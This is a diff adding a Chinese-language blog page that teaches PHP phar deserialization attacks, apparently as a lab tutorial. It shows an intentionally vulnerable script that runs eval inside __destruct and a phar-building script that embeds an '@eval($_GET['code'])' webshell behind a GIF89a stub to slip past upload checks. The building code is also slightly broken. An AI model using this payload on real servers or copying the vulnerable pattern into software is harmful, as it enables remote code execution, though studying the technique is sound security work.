@@ -1,0 +1,239 @@
+<!DOCTYPE html>
+<html lang=>
+  <head><meta name="generator" content="Hexo 3.8.0">
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta http-equiv="X-UA-Compatible" content="ie=edge">
+  <meta name="description" content="">
+  <meta name="keywords" content="root">
+  
+    <link rel="icon" href="/favicon.ico">
+  
+    
+  <title>php反序列化之phar | The clown is laughing at you</title>
+  <link rel="stylesheet" href="/style.css">
+  <link rel="stylesheet" href="/lib/jquery.fancybox.min.css">
+  <link href="https://maxcdn.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css">
+</head>
+
+<body>
+  <header>
+  <div class="header-container">
+    <a class="logo" href="/">
+      <span>The clown is laughing at you</span>
+    </a>
+    <ul class="right-header">
+      
+        <li class="nav-item">
+          
+            <a href="/" class="item-link">首页</a>
+          
+        </li>
+      
+        <li class="nav-item">
+          
+            <a href="/about" class="item-link">关于</a>
+          
+        </li>
+      
+        <li class="nav-item">
+          
+            <a href="/archives" class="item-link">归档</a>
+          
+        </li>
+      
+        <li class="nav-item">
+          
+            <a href="/tags" class="item-link">标签</a>
+          
+        </li>
+      
+    </ul>
+  </div>
+</header>
+
+  <main id="post">
+  <div class="content">
+    <article>
+        <section class="content markdown-body">
+          <h1>php反序列化之phar</h1>
+          <div class="post-meta">
+            <i class="fa fa-calendar" aria-hidden="true"></i> <time>2019/06/07</time>
+            
+            
+          </div>
+          <h1 id="phar介绍"><a href="#phar介绍" class="headerlink" title="phar介绍"></a>phar介绍</h1><p>参考文章：<br><a href="https://mochazz.github.io/2019/02/02/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%85%A5%E9%97%A8%E4%B9%8Bphar/" target="_blank" rel="noopener">PHP反序列化入门之phar</a></p>
+<p>phar就是php压缩文档，它可以把多个文件归档到同一个文件中，而且不经过解压就能被 php 访问并执行，与<strong>file://</strong>,<strong> php://</strong>等类似，也是一种流包装器。</p>
+<p>phar结构由 4 部分组成</p>
+<p><strong>stub phar</strong> 文件标识，格式为 xxx&lt;?php xxx; __HALT_COMPILER();?&gt;；<br><strong>manifest</strong> 压缩文件的属性等信息，以序列化存储；<br><strong>contents</strong> 压缩文件的内容；<br><strong>signature</strong> 签名，放在文件末尾；</p>
+<h2 id="划重点"><a href="#划重点" class="headerlink" title="划重点"></a>划重点</h2><p>这里有两个关键点:<br>(1) 文件标识，必须以<strong>__HALT_COMPILER();?&gt;</strong>结尾，但前面的内容没有限制，也就是说我们可以轻易伪造一个图片文件或者pdf文件来绕过一些上传限制；</p>
+<p>(2) 反序列化，phar存储的meta-data信息以序列化方式存储，当文件操作函数通过phar://伪协议解析phar文件时就会将数据反序列化，而这样的文件操作函数有很多。</p>
+<h1 id="漏洞测试"><a href="#漏洞测试" class="headerlink" title="漏洞测试"></a>漏洞测试</h1><p>现有一段测试代码如下：<br>这个环境搭建晚之后，要将代码<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">foo</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">var</span> $ha = <span class="string">'echo "ok";'</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="keyword">$this</span>-&gt;ha);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$ka = $_GET[<span class="string">'file'</span>];</span><br><span class="line">file_exists($ka);</span><br></pre></td></tr></table></figure></p>
+<p>在foo()类中的$ha是可控的，并且存在__destruct()魔术方法，这里存在反序列化漏洞，那么通过函数file_exists()对文件进行操作，运用到phar的知识点。</p>
+<p>除了<strong>file_exists()</strong>以外，能触发这种漏洞的函数还有：<br><img src="/2019/06/07/php反序列化之phar/1.png" alt=""></p>
+<p>我们构造phar文件的代码：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    </span><br><span class="line">  <span class="comment">//将我们需要放入的反序列化内容放在此处  </span></span><br><span class="line">  <span class="class"><span class="keyword">class</span> <span class="title">foo</span></span></span><br><span class="line"><span class="class">  </span>&#123;</span><br><span class="line">  	<span class="keyword">var</span> $ha = <span class="string">"@eval($_GET['code'])"</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  $o = <span class="keyword">new</span> foo();</span><br><span class="line">  filename = <span class="string">'shell.phar'</span>;<span class="comment">//后缀名必须为phar,否则代码执行不了</span></span><br><span class="line">  file_exists($filename) ? unlink($filename) : <span class="keyword">null</span>;</span><br><span class="line">  $phar-&gt;startBuffering();</span><br><span class="line">  $phar-&gt;setStub(<span class="string">"GIF89a&lt;?php __HALT_COMPILER(); ?&gt;"</span>);</span><br><span class="line">  $phar-&gt;setMetadata($o);<span class="comment">//此处存放数据的方式是以序列化的方式存放</span></span><br><span class="line">  $phar-&gt;addFromString(<span class="string">"shell.txt"</span>,<span class="string">"bar"</span>);</span><br><span class="line">  $phar-&gt;stopBuffering();</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p>
+<p><strong>$phar-&gt;setMetadata($o);//此处存放数据的方式是以序列化的方式存放<br>生成一个shell.phar文件，然后我们通过伪协议phar://读取，数据就会被反序列化，那么我们定义的$ha就会被传入</strong></p>
+<p>我们可以修改phar文件后缀为gif.<br><img src="/2019/06/07/php反序列化之phar/2.png" alt=""></p>
+<p>然后访问该gif文件：<br><img src="/2019/06/07/php反序列化之phar/3.png" alt=""></p>
+
+        </section>
+    </article>
+    
+        <!-- disqus 评论框 start -->
+        <div class="comment">
+            <div id="disqus_thread" class="disqus-thread">
+              <i>Loading comments box needs to over the wall</i>
+            </div>
+        </div>
+        <!-- disqus 评论框 end -->
+    
+    
+        <!-- livere 评论框 start -->
+        <div class="comment">
+            <div id="lv-container" data-id="city" data-uid="your_livere_uid"></div>
+        </div>
+        <!-- livere 评论框 end -->
+        
+  </div>
+  <aside>
+    
+    <div class="toc-container">
+        <h1>目录</h1>
+        <div class="content">
+            <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#phar介绍"><span class="toc-number">1.</span> <span class="toc-text">phar介绍</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#划重点"><span class="toc-number">1.1.</span> <span class="toc-text">划重点</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#漏洞测试"><span class="toc-number">2.</span> <span class="toc-text">漏洞测试</span></a></li></ol>
+        </div>
+    </div>
+    
+  </aside>
+</main>
+
+<!-- disqus 公共JS代码 -->
+<script type="text/javascript">
+  /* * * CONFIGURATION VARIABLES * * */
+  var disqus_shortname = "your_disqus_shortname";
+  var disqus_identifier = "http://yoursite.com/2019/06/07/php反序列化之phar/";
+  var disqus_url = "http://yoursite.com/2019/06/07/php反序列化之phar/";
+
+  isAgent(getDisqus)
+
+  // determine user agent in China
+  function isAgent(cb) {
+    var url = '//graph.facebook.com/feed?callback=h';
+    var xhr = new XMLHttpRequest();
+    var called = false;
+    xhr.open('GET', url);
+    xhr.onreadystatechange = function() {
+      if (xhr.readyState === 4 && xhr.status === 200) {
+      called = true;
+      cb(true);
+      }
+    };
+    xhr.send();
+    // timeout 1s, this facebook API is very fast.
+    setTimeout(function() {
+      if (!called) {
+      xhr.abort();
+      cb(false)
+      }
+    }, 1000);
+  }
+
+  function getDisqus(isAgent) {
+    var dsq = document.createElement('script'); dsq.type = 'text/javascript'; 
+    dsq.async = true
+    dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+    (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq)
+  }
+</script>
+<!-- disqus 公共JS代码 end -->
+
+
+<script type="text/javascript">
+  (function(d, s) {
+      var j, e = d.getElementsByTagName(s)[0];
+
+      if (typeof LivereTower === 'function') { return; }
+
+      j = d.createElement(s);
+      j.src = 'https://cdn-city.livere.com/js/embed.dist.js';
+      j.async = true;
+
+      e.parentNode.insertBefore(j, e);
+  })(document, 'script');
+</script>
+
+
+  <footer>
+  <div class="copyright">
+    <div>
+      &copy; 2019 | Powered by <a href="https://hexo.io" target="_blank">Hexo</a>&nbsp
+    </div>
+    <div>
+      Theme by <a href="https://github.com/lewis-geek/hexo-theme-Aath" target="_blank">Aath</a>
+    </div>
+  </div>
+</footer>
+
+
+<script src="https://cdn.bootcss.com/jquery/3.2.1/jquery.min.js"></script>
+<script src="/lib/in-view.min.js"></script>
+<script src="/lib/lodash.min.js"></script>
+<script>
+  var isDown = true
+  var oldY = 0
+  inView.offset(50)
+
+  document.body.addEventListener('touchstart', function(){});
+  
+  window.addEventListener('scroll', _.throttle(e => {
+    var currentY = window.scrollY
+    if((oldY - currentY) < 0) {
+      isDown = true
+    } else {
+      isDown = false
+    }
+    oldY = currentY
+  }, 250))
+
+  $("article img").each(function() {
+      var strA = "<a data-fancybox='gallery' href='" + this.src + "'></a>";
+      $(this).wrapAll(strA);
+  });
+
+  $('.toc-link').each(function() {
+      var href = $(this).attr("href");
+      
+      inView(href).on('exit', () => {
+        if (isDown) {
+          handleActive(href)
+        }
+      })
+
+      inView(href).on('enter', () => {
+        if (!isDown) {
+          handleActive(href)
+        }
+      })
+
+      this.onclick = function(e) {
+        var pos = $(href).offset().top - 10;
+        $("html,body").animate({scrollTop: pos}, 300);
+        setTimeout(() => {
+          handleActive(href)
+        }, 350)
+        return false
+      }
+  })
+
+  function handleActive(href) {
+    document.querySelectorAll('.toc-link').forEach(elm => {
+      elm.classList.remove('active')
+    })
+    document.querySelector(".toc [href='"+ href +"']").classList.add('active')
+  }
+</script>
+<script src="/lib/jquery.fancybox.min.js"></script>
+
+
+</body>
+</html>
